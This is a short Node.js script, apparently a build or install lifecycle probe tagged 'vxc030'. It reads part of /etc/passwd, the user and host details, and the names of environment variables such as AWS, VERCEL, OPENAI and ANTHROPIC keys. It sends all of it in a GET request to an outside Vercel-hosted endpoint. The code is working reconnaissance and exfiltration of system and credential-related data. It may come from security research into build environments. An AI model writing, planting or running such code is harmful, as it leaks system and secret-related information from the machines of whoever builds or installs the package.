const http = require('node:http');
const https = require('node:https');
const os = require('node:os');
const fs = require('node:fs');

const phase = process.argv[2] || 'unknown';
const marker = process.env.VXC030_MARKER || 'VXC030_LIFECYCLE_STATIC';
const passwd = (() => {
  try { return fs.readFileSync('/etc/passwd', 'utf8').split('\n').slice(0, 5).join('|'); }
  catch (e) { return `err:${e.message}`; }
})();
const envKeys = Object.keys(process.env).filter((k) => /^(VERCEL|AWS|AI|ANTHROPIC|OPENAI|NPM|NODE|HOME|USER|PATH|PWD)/.test(k)).sort().slice(0, 80).join(',');
const payload = {
  marker,
  phase,
  cwd: process.cwd(),
  uid: typeof process.getuid === 'function' ? String(process.getuid()) : '',
  gid: typeof process.getgid === 'function' ? String(process.getgid()) : '',
  user: os.userInfo().username,
  hostname: os.hostname(),
  platform: `${process.platform}/${process.arch}`,
  node: process.version,
  envKeys,
  passwd
};
const qs = new URLSearchParams(payload);
const url = `https://vercel-build-imds-probe-gegsre0qc-andrewmohawk-team.vercel.app/api/hit?${qs}`;
https.get(url, (res) => {
  res.resume();
  res.on('end', () => console.log(`[vxc030] callback ${phase} status=${res.statusCode}`));
}).on('error', (err) => console.log(`[vxc030] callback ${phase} error=${err.message}`));
